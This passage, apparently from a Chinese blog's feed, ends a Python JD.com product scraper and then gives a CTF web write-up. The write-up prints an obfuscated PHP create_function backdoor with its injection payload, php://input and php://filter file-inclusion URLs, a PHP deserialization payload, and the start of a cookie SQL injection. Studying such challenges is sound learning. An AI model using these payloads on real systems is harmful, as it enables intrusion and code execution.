worksheet.set_column(<span class="string">'D:D'</span>, <span class="number">16</span>)</span><br><span class="line">    worksheet.set_column(<span class="string">'E:E'</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> worksheet</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">storeGoodsList</span><span class="params">(data_, worksheet, row=<span class="number">1</span>)</span>:</span></span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> title, price, commit, img, shop <span class="keyword">in</span> data_:</span><br><span class="line">        res_price = re.match(<span class="string">'^(￥\d+)'</span>, price.text.strip())  <span class="comment"># 去除多余￥</span></span><br><span class="line">        res_shop = re.match(<span class="string">'^&lt;a.+title="(.+)"&gt;'</span>, str(shop))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'title'</span> :   title.text.strip().split(<span class="string">'\n'</span>)[<span class="number">0</span>],</span><br><span class="line">            <span class="string">'price'</span> :   res_price.group(<span class="number">1</span>),</span><br><span class="line">            <span class="string">'commit'</span>:   <span class="string">'已有'</span> + commit.text.strip(),</span><br><span class="line">            <span class="string">'link'</span>  :   <span class="string">'https:'</span> + img.find_all(<span class="string">'a'</span>)[<span class="number">0</span>].get(<span class="string">"href"</span>).split(<span class="string">';'</span>)[<span class="number">0</span>],</span><br><span class="line">            <span class="string">'shop'</span>  :   res_shop.group(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        worksheet.write(row, col, data[<span class="string">'title'</span>])</span><br><span class="line">        worksheet.write(row, col+<span class="number">1</span>, data[<span class="string">'shop'</span>])</span><br><span class="line">        worksheet.write(row, col+<span class="number">2</span>, data[<span class="string">'price'</span>])</span><br><span class="line">        worksheet.write(row, col+<span class="number">3</span>, data[<span class="string">'commit'</span>])</span><br><span class="line">        worksheet.write(row, col+<span class="number">4</span>, data[<span class="string">'link'</span>])</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(good, pages)</span>:</span></span><br><span class="line">    workbook = xlsxwriter.Workbook(good +  <span class="string">'.xlsx'</span>)  <span class="comment"># 创建表</span></span><br><span class="line">    worksheet = createListHeader(workbook)</span><br><span class="line">    urls = generateURL(good, pages=pages)       <span class="comment"># 生成URLs</span></span><br><span class="line">    row = <span class="number">1</span>                                     <span class="comment"># 第一行开始写入</span></span><br><span class="line">    print(<span class="string">"\n开始爬取京东商品信息\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = get_html(url)</span><br><span class="line">            data = parsePage(html)</span><br><span class="line">            time = datetime.datetime.now()</span><br><span class="line">            print(str(time)[<span class="number">11</span>:<span class="number">19</span>] +<span class="string">" 正在爬取 "</span> + good + <span class="string">" 的第 "</span>+str(row//<span class="number">25</span>+<span class="number">1</span>)+<span class="string">" 页内容"</span>)</span><br><span class="line">            storeGoodsList(data, worksheet, row)</span><br><span class="line">            row += <span class="number">25</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(url, <span class="string">" 页面出错"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"\n 存储成功！"</span>)</span><br><span class="line">        workbook.close()</span><br><span class="line">        print(<span class="string">"\n ------爬取结束------"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\n-------------------文档关闭失败----------------\n"</span>)</span><br><span class="line">        print(<span class="string">"--------------请先关闭 Excel 再重新爬取--------"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    good = input(<span class="string">"请输入要查询的商品：\n"</span>)</span><br><span class="line">    pages = int(input(<span class="string">"\n请输入要查询的页数：\n"</span>))</span><br><span class="line">    main(good, pages)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。&quot;&gt;&lt;a href=&quot;#爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel。&quot; class=&quot;headerlink&quot; title=&quot;爬取商品的标题、店铺、价格、评价数以及链接，存储为Excel
      
    
    </summary>
    
    
      <category term="爬虫" scheme="https://wywwzjj.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Raccoon web Writeup</title>
    <link href="https://wywwzjj.top/2018/10/26/Raccoon_Writeup/"/>
    <id>https://wywwzjj.top/2018/10/26/Raccoon_Writeup/</id>
    <published>2018-10-26T09:56:50.000Z</published>
    <updated>2019-02-28T09:02:14.645Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP-后门分析"><a href="#PHP-后门分析" class="headerlink" title="PHP 后门分析"></a>PHP 后门分析</h3><p>李大猫在他的 WordPress 博客里发现了被黑客植入的 PHP 后门，快帮他分析分析这个后门要怎么利用吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$z0 = $_REQUEST[<span class="string">'sort'</span>];</span><br><span class="line">$q1 = <span class="string">''</span>;</span><br><span class="line">$c2 = <span class="string">"wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2"</span>;</span><br><span class="line">$y3 = <span class="keyword">array</span>(<span class="number">8</span>,<span class="number">38</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">25</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">7</span>);</span><br><span class="line"><span class="keyword">foreach</span>($y3 <span class="keyword">as</span> $h4)&#123;</span><br><span class="line">$q1.=$c2[$h4];  <span class="comment">// q1 = base64_decode</span></span><br><span class="line">&#125;</span><br><span class="line">$v5 = strrev(<span class="string">"noi"</span>.<span class="string">"tcnuf"</span>.<span class="string">"_eta"</span>.<span class="string">"erc"</span>);  <span class="comment">// create_function</span></span><br><span class="line">$j6 = $v5(<span class="string">""</span>,$q1($z0));  <span class="comment">// j6 = create_function("",base64_decode(sort))</span></span><br><span class="line">$j6();<span class="comment">// j6() 是一个没有参数的匿名函数，</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>create_function() 与 eval()  有同样的危险性，可以注入恶意代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入 $a = &#125;phpinfo();/* 后：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>;&#125;</span><br><span class="line">  phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line">create_function(args, code)  <span class="comment">// The function arguments. The function code.</span></span><br><span class="line">$j6() =&gt; <span class="function"><span class="keyword">function</span><span class="params">(args)</span> </span>&#123;</span><br><span class="line">code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题只需将 <code>}phpinfo();/*</code> 进行 base64 编码，再传进去就 OK 了</p><p><img src="https://i.loli.net/2018/11/26/5bfb937137af2.png" alt="1541723641637.png"></p><p><br></p><h3 id="抓包和改包"><a href="#抓包和改包" class="headerlink" title="抓包和改包"></a>抓包和改包</h3><p>满足以下全部条件就能获得 flag</p><ul><li>将 HTTP 请求方式修改为 POST</li><li>添加 HTTP 请求头“X-Give-Me-Flag”，值为 1</li><li>将包含浏览器标识的 HTTP 请求头的值修改为“Flag Browser 1.0”</li><li>将 Cookie 中“auth”的值修改为 117.29.42.247</li><li>POST 键名为“action”，值为“readflag”的数据</li></ul><p>这题比较简单，直接用 Burp 改一下就 OK 了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: http01.web.raccoon.ml:8080</span><br><span class="line">User-Agent: Flag Browser 1.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: auth=117.29.42.247</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">X-Give-Me-Flag: 1</span><br><span class="line">Content-Length: 15</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">action=readflag</span><br></pre></td></tr></table></figure><p><br></p><h3 id="Javascript-Tricks"><a href="#Javascript-Tricks" class="headerlink" title="Javascript Tricks"></a>Javascript Tricks</h3><p>nc 45.32.250.222 8082</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"></span><br><span class="line">flag=<span class="string">'fake_flag'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = net.createServer(</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">socket.on(<span class="string">'data'</span>, (data) =&gt; &#123; </span><br><span class="line"><span class="comment">//m = data.toString().replace(/[\n\r]*$/, '');</span></span><br><span class="line">ok = <span class="literal">true</span>;</span><br><span class="line">arr = data.toString().split(<span class="string">' '</span>);  <span class="comment">// 空格作为分隔，创建数组</span></span><br><span class="line">arr = arr.map(<span class="built_in">Number</span>);<span class="comment">// 全部转为数字</span></span><br><span class="line"><span class="keyword">if</span> (arr.length != <span class="number">5</span>)    <span class="comment">// arr长度为5</span></span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr1 = arr.slice(<span class="number">0</span>);    <span class="comment">// 抽取从0开始的所有字符(就是复制arr给arr1)</span></span><br><span class="line">arr1.sort();  </span><br><span class="line"><span class="comment">// js sort比较特殊  10,5,40,25,1000,1 -&gt; 1,10,1000,25,40,5</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)  <span class="comment">// 前后元素不能相同</span></span><br><span class="line"><span class="keyword">if</span> (arr1[i+<span class="number">1</span>] == arr1[i] || arr[i] &lt; <span class="number">0</span> || arr1[i+<span class="number">1</span>] &gt; <span class="number">127</span>)</span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr2 = []</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">arr2.push(arr1[i] + arr1[i+<span class="number">1</span>]);</span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">val = val * <span class="number">0x100</span> + arr2[i];  <span class="comment">// 0x100 = 256</span></span><br><span class="line"><span class="keyword">if</span> (val != <span class="number">0x23332333</span>)  <span class="comment">// 590553907</span></span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (ok)</span><br><span class="line">socket.write(flag+<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">socket.write(<span class="string">'nope\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//socket.write('Echo server\r\n');</span></span><br><span class="line"><span class="comment">//socket.pipe(socket);</span></span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'0.0.0.0'</span></span><br><span class="line">PORT = <span class="number">8082</span></span><br><span class="line"></span><br><span class="line">server.listen(PORT, HOST);</span><br></pre></td></tr></table></figure><p>初步思路：把 data 暴力跑出来，再 nc 提交一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a,b,c,d)</span>:</span></span><br><span class="line">    arr = [a,b,c,d]</span><br><span class="line">    val = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        val = val * <span class="number">256</span> + arr[i]</span><br><span class="line">    <span class="keyword">if</span> val == <span class="number">590553907</span>:  <span class="comment"># 也可以不转十进制</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">60</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(N):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(N):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(N):</span><br><span class="line">                <span class="keyword">if</span> check(i,j,k,l):</span><br><span class="line">                    print(i,j,k,l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># arr2 = [35 51 35 51]</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">51</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(N):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(N):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> range(N):</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> range(N):</span><br><span class="line">                    <span class="keyword">if</span> i+j == <span class="number">35</span> <span class="keyword">and</span> j+k == <span class="number">52</span> <span class="keyword">and</span> k+l == <span class="number">35</span> <span class="keyword">and</span> l+m == <span class="number">51</span>:</span><br><span class="line">                        print(i,j,k,l,m)</span><br><span class="line">                        </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0 35 17 18 33</span></span><br><span class="line"><span class="string">1 34 18 17 34</span></span><br><span class="line"><span class="string">2 33 19 16 35</span></span><br><span class="line"><span class="string">3 32 20 15 36</span></span><br><span class="line"><span class="string">4 31 21 14 37</span></span><br><span class="line"><span class="string">5 30 22 13 38</span></span><br><span class="line"><span class="string">6 29 23 12 39</span></span><br><span class="line"><span class="string">7 28 24 11 40</span></span><br><span class="line"><span class="string">8 27 25 10 41</span></span><br><span class="line"><span class="string">9 26 26 9 42</span></span><br><span class="line"><span class="string">10 25 27 8 43</span></span><br><span class="line"><span class="string">11 24 28 7 44</span></span><br><span class="line"><span class="string">12 23 29 6 45</span></span><br><span class="line"><span class="string">13 22 30 5 46</span></span><br><span class="line"><span class="string">14 21 31 4 47</span></span><br><span class="line"><span class="string">15 20 32 3 48</span></span><br><span class="line"><span class="string">16 19 33 2 49</span></span><br><span class="line"><span class="string">17 18 34 1 50</span></span><br><span class="line"><span class="string">18 17 35 0 51</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据不多，直接按照 js 的 sort 规则手工挑选一下 </span></span><br><span class="line"><span class="comment"># 可得最终的 data：15 20 32 3 48</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="The-user-admin"><a href="#The-user-admin" class="headerlink" title="The user admin"></a>The user admin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">user = <span class="variable">$_GET</span>[<span class="string">"user"</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">file = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pass = <span class="variable">$_GET</span>[<span class="string">"pass"</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">user)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span></span><br><span class="line">    echo "hello admin!&lt;br&gt;";</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo "you are not admin ! ";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题涉及到PHP的代码审计，PHP的伪协议，PHP的序列化，PHP魔术方法，涨了不少姿势，</p><p>趁着写 Writeup 把思路再梳理一下。<a href="https://blog.csdn.net/csu_vc/article/details/78375203" target="_blank" rel="noopener">参考博客1</a>  <a href="https://blog.csdn.net/yh1013024906/article/details/81087939" target="_blank" rel="noopener">参考博客2</a> </p><p>乍一看，玄机只可能在 class.php 里面，现在就是寻找满足 if 的这个条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br><span class="line"><span class="comment">// 把整个文件读入一个字符串中，后四个参数都是可选项</span></span><br></pre></td></tr></table></figure><p>问题变为，怎么读取 $user 之后得到 “the user is admin”。</p><p>这里涉及到一个 PHP伪协议，<code>php://input</code>，可读取没有处理过的 POST 数据。<a href="https://blog.csdn.net/qq_27682041/article/details/73326435" target="_blank" rel="noopener">详细讲解</a>  <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">大佬讲解</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.187.100:8081/?user=php://input</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再 post 一个 <span class="string">"the user is admin"</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 此时可以发现界面变成了 <span class="string">"hello admin!"</span></span></span><br><span class="line">http://120.78.187.100:8081/?user=php://input&amp;file=class.php</span><br></pre></td></tr></table></figure><p>然后还是没卵用？？</p><p>还有个文件包含漏洞，再来了一个 PHP伪协议，<code>php://filter</code>，可用来读取base64编码后的源代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span><br></pre></td></tr></table></figure><p>解码之后，得到 class.php 的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 注意到有个魔术方法 __tostring()，echo $obj 时会自动执行的一个函数</span></span><br></pre></td></tr></table></figure><p>看一下 index.php 源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">    $file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">    $pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;  <span class="comment">// 直接过滤掉 fla9</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">            $pass = unserialize($pass);  <span class="comment">// 反序列化再输出</span></span><br><span class="line">            <span class="keyword">echo</span> $pass;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// unserialize()</span></span><br></pre></td></tr></table></figure><p>总结一下思路，flag 就隐藏在 <code>f1a9.php</code> 里面，但是无法直接读取 f1a9.php 内容(被preg_match过滤)，只能通过<code>Read</code> 这个类中 __tostring() 方法里的 <code>file_get_sontents()</code>。能作为输入接口的就只有 pass 了，pass 这里又会反序列化再输出，所以利用 <code>echo $pass;</code> 来创建对象就可以了。</p><p>创建序列化对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Read();</span><br><span class="line">$a-&gt;file = <span class="string">"f1a9.php"</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br></pre></td></tr></table></figure><p>最终执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.187.100:8081/?user=php://input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 再 post 一个 <span class="string">"the user is admin"</span></span></span><br></pre></td></tr></table></figure><p><br> </p><h3 id="Easy-waf"><a href="#Easy-waf" class="headerlink" title="Easy waf"></a>Easy waf</h3><p>随手扫一下后台，得到了一个 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 的源码包，然后就是代码审计了。</p><p>第一想法是 <code>username</code> 和 <code>password</code> 可以注入，毕竟过滤函数不会对他们进行处理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">    if ($key != "username"&amp;&amp;strstr($key, "password") == false) &#123;</span><br><span class="line">        $_POST[$key] = filtering($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后来发现 <code>uesr_id</code> 可以注入，最终在 <code>login.php</code> 中找到 <code>user_id</code> 的来源，就是数据库中的键。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line">&lt;h2&gt;历史留言&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $user_id=$_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from content where user_id=$user_id"</span>;</span><br><span class="line">$arr = select($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// login.php</span></span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $a[<span class="string">'username'</span>];  <span class="comment">// 在这里</span></span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $a[<span class="string">'id'</span>]; <span class="comment">// 手动高亮</span></span><br></pre></td></tr></table></figure><p>GET、POST都被直接过滤了，试试 cookie 注入，手工注入不太会，先跑跑 sqlmap 试试。<a href="https://blog.csdn.net/u011781521/article/details/58135307" target="_blank" rel="noopener">参考博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 